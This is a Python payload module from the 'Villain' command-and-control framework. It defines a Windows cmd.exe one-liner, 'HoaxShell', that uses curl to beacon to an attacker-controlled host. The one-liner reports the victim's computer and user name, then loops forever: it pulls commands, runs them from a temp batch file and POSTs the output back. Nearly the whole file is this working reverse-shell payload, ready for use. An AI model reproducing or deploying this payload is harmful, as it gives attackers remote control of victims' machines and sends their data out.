# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'Windows CMD cURL HoaxShell',
        'Author' : 'Panagiotis Chartas (t3l3machus)',
        'Description' : 'An Http based beacon-like reverse shell that utilizes cURL',
        'References' : ['https://github.com/t3l3machus/hoaxshell', 'https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'hoaxshell',
        'type' : 'cmd-curl',
        'os' : 'windows',
        'shell' : 'cmd.exe'
    }

    config: ClassVar[dict] = {
        'frequency' : 1
    }

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = '@echo off&cmd /V:ON /C "SET ip=*LHOST*&&SET sid="*HOAXID*: *SESSIONID*"&&SET protocol=http://&&curl !protocol!!ip!/*VERIFY*/!COMPUTERNAME!/!USERNAME! -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/*GETCMD* -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/*POSTRES* -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout *FREQ*" > NUL'
